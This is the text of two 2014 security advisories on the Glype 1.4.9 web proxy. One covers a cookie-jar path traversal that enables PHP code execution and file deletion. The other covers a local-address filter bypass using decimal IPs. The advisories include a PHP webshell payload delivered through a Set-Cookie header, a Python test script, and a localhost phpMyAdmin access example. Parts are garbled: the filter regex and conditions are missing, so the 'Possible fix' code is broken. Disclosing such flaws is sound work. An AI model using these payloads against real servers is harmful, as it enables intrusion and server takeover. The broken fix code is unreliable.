Glype proxy cookie jar path traversal allows code execution
------------------------------------------------------------------------
Securify, September 2014

------------------------------------------------------------------------
Abstract
------------------------------------------------------------------------
A path traversal vulnerability has been identified in the Glype
web-based proxy that allows an attacker to run arbitrary PHP code on the
server or to remove critical files from the filesystem. This only
affects servers that are configured to:

- store Glype cookies locally; AND
- disable PHP display_errors; AND
- allow the webserver process to write to the filesystem (document
root).

------------------------------------------------------------------------
Affected versions
------------------------------------------------------------------------
This issue has been identified in Glype 1.4.9. Older version are most
likely affected as well.

------------------------------------------------------------------------
Fix
------------------------------------------------------------------------
Glype was informed and a fixed version (1.4.10) is now available at
www.glype.com

File creation via path traversal

When the "Store cookies on server" option is set in admin.php, Glype will create a cookie jar on the server to store a user&#039;s cookies. The filename for the cookie jar is created using the user&#039;s session ID.

browse.php

$toSet[CURLOPT_COOKIEFILE] = $toSet[CURLOPT_COOKIEJAR] = $CONFIG[&#039;cookies_folder&#039;] . session_id();
PHP takes this session ID from a cookie, so the value returned by session_id() is under control of the user. By using path traversal a user can overwrite or create any file on the server with the rights of the webserver&#039;s system user.

Code execution

As a POC the following steps were taken to create and run a malicious PHP file in the webroot:

1. Glype was installed with the "Store cookies on server" option set in admin.php. The cookie directory remained default (tmp/cookies/).
2. A request was initiated with the Glype session cookie&#039;s value set to "../../test.php".
3. The Glype proxy was used to surf to a Securify controlled domain that returned a header that set a cookie containing a malicious PHP script.

Set-Cookie: TestCookie=<?php echo shell_exec($_GET[&#039;cmd&#039;]) ?>; expires=Thu, 31-Aug-2014 19:14:10 GMT

This caused Glype to write this PHP backdoor to test.php in the webroot. When requested using a browser, PHP parses the cookie jar file containing the malicious PHP code.

The following Python code can be used as a simple test to verify if your Glype installation is affected:

import urllib2

server = &#039;http://<glype server>&#039;
url = &#039;/browse.php?u=http%3A%2F%2Fwww.glype.com&b=28&#039;

req = urllib2.Request(server + url)
req.add_header(&#039;Referer&#039;, server)
req.add_header(&#039;Cookie&#039;, &#039;s=../securify&#039;)
r = urllib2.urlopen(req)

You are affected if a file named "securify" is created outside of the cookie directory.

Arbitrary file removal

The following code is affected by a (similar) path traversal vulnerability allowing an attacker to remove any file the HTTP process has access to:

includes/process.php

# Look for cookie file and check writable
if ( is_writable($file = $CONFIG[&#039;cookies_folder&#039;] . session_id()) ) {

   # Delete it
   unlink($file);
}

This can for example be exploited to put a Glype server out of service or to clear log files.

Glype proxy local address filter bypass
------------------------------------------------------------------------
Securify, September 2014

------------------------------------------------------------------------
Abstract
------------------------------------------------------------------------
A vulnerability has been identified in the Glype web-based proxy. Glype
has a filter to disallow users from surfing to local addresses, to
on. The filter can easily be bypassed by using IPs in decimal form.

------------------------------------------------------------------------
Affected versions
------------------------------------------------------------------------
This issue has been identified in Glype 1.4.9. Older version are most
likely affected as well.

------------------------------------------------------------------------
Fix
------------------------------------------------------------------------
Glype was informed and a fixed version (1.4.10) is now available at

Glype local address bypass


browse.php
# Protect LAN from access through proxy (protected addresses copied from PHProxy)
   error(&#039;banned_site&#039;, $URL[&#039;host&#039;]);
}

This regex can easily be bypassed by using a decimal format IP address, which allows an attacker to browse/attack the internal server/network Glype is running on.

For example, if a server running Glype also runs phpmyadmin or another admin panel on local host, browsing to http://2130706433/phpmyadmin (2130706433 equals 127.0.0.1 in decimal) causes Glype to create a local connection to phpmyadmin, allowing remote access. Other internal web pages running on the internal network could be accessed like this as well.

Possible fix


$URL[&#039;host&#039;] = gethostbyname($URL[&#039;hostâ€™]);

# Protect LAN from access through proxy (protected addresses copied from PHProxy)
   error(&#039;banned_site&#039;, $URL[&#039;host&#039;]);
}
